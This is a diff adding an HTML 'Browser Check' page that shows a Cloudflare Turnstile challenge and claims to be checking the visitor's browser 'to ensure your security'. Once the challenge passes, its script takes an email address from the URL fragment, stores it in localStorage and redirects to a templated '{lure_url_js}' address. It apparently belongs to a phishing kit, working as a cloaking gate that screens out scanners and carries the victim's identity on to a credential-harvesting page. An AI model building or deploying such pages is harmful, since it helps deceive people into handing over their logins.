@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onloadTurnstileCallback" defer></script>
+    <title>Browser Check</title>
+    <style>
+        body {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 50vh;
+            margin: 0;
+            background-color: #ffffff; /* Set background color to white */
+        }
+
+        #container {
+            text-align: center;
+        }
+    </style>
+
+    <script>
+        function javascriptCallback() {
+            var aemail = "";
+            var decodedStringAtoB = "";
+            console.log(window.location.href.split('#'));
+            if(window.location.hash) {
+                const myArr = window.location.hash.split("#");
+                aemail = myArr[1];
+                decodedStringAtoB = aemail;
+            }
+            //   console.log(aemail)
+            localStorage.setItem('email', decodedStringAtoB);
+            localStorage.setItem('everthingood', "true");
+            const cat = localStorage.getItem('email');
+            setTimeout(()=>{
+                window.location.assign({lure_url_js});
+            },1430)
+            console.log(cat)
+        }
+    </script>
+</head>
+<body>
+<div id="container">
+    <p style="font-size: 30px;">Please Stand By</p>
+    <p style="font-weight: lighter;">While we are checking your browser</p>
+    <div class="cf-turnstile" data-sitekey="0x4AAAAAAAJR3UrPNeoKI_Lw" data-callback="javascriptCallback"></div>
+    <small style="font-weight: lighter;">This page is performing browser checks to ensure your security</small>
+
+    <!-- Add your ReCAPTCHA code here -->
+    <!-- Replace 'YOUR_RECAPTCHA_SITE_KEY' with your actual ReCAPTCHA site key -->
+
+    <!-- Include the ReCAPTCHA script -->
+    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+</div>
+</body>
+</html>
